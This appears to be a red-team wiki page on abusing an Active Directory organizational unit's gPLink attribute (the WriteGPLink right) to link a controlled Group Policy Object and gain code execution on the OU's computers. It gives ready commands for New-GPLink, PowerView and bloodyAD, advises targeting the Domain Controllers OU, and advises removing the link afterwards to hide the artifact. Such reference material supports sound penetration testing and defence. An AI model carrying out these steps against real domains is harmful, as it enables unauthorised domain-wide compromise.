---
title: "Linking a GPO: applying policy through gPLink"
description: "Abusing write access to an organizational unit's gPLink attribute (the WriteGPLink right) to link a controlled or editable Group Policy Object to the OU, bringing every user and computer under it into the policy's scope."
keywords:
  - WriteGPLink
  - gPLink
  - organizational unit
  - group policy
  - New-GPLink
---

# Linking a GPO

Editing a GPO needs write access to that GPO. **Linking** needs only write access to an **organizational unit's `gPLink`** attribute (the `WriteGPLink` edge). With it, you attach a GPO you control to the OU, and every user and computer under that OU comes into the GPO's scope and processes it. It is the second route to GPO code execution, reached from control of a container rather than a policy.

## The attack

You need two things: write over the target OU's `gPLink`, and a GPO whose contents you control.

```powershell
# RSAT / Group Policy module: link an existing GPO to the target OU
New-GPLink -Name "Vulnerable GPO" -Target "OU=Workstations,DC=example,DC=local" -LinkEnabled Yes

# PowerView: write the gPLink attribute directly
Set-DomainObject -Identity 'OU=Workstations,DC=example,DC=local' `
  -Set @{'gplink'='[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=example,DC=local;0]'}
```

```bash
# From Linux, set the OU gPLink over LDAP (bloodyAD)
bloodyAD --host <dc> -d example.local -u user -p pass set object \
  'OU=Workstations,DC=example,DC=local' gPLink \
  -v '[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=example,DC=local;0]'
```

Then push an [immediate scheduled task into that GPO](editing-a-gpo.md) (or use a GPO that already carries one), and the newly-scoped machines run it.

## Getting a GPO to link

- **A GPO you can already edit**: link it to the new OU, widening its reach to the OU's objects.
- **A GPO you create**: members of **Group Policy Creator Owners** (or with create rights in the Policies container) can make a new GPO, populate it, and link it. By default ordinary users cannot create GPOs, so this path needs that membership.
- Combined, `WriteGPLink` over a high-value OU plus any editable GPO is code execution on that OU's contents.

## Exploitation notes

- Target an OU that contains **privileged or numerous** computers; `WriteGPLink` on the Domain Controllers OU is domain-critical.
- The link takes effect on the next Group Policy refresh for objects in the OU, like any applied GPO.
- **Remove the link** afterwards (restore the original `gPLink` value); an unexpected link on a sensitive OU is a visible artifact. `gPLink` is a single string of `[DN;flags]` entries, so preserve the others when editing.
- BloodHound models this as the `WriteGPLink`/`GPLink` edge from a principal to an OU and resolves the objects affected.

## Tools

- **bloodyAD** / **ldapmodify**: set the OU `gPLink` from Linux.
- **PowerView `Set-DomainObject`** / **RSAT `New-GPLink`**: link from a Windows shell.
- **BloodHound**: `WriteGPLink` edges and the affected object set.

## References

- The Hacker Recipes: Group policies
- SpecterOps: BloodHound WriteGPLink edge
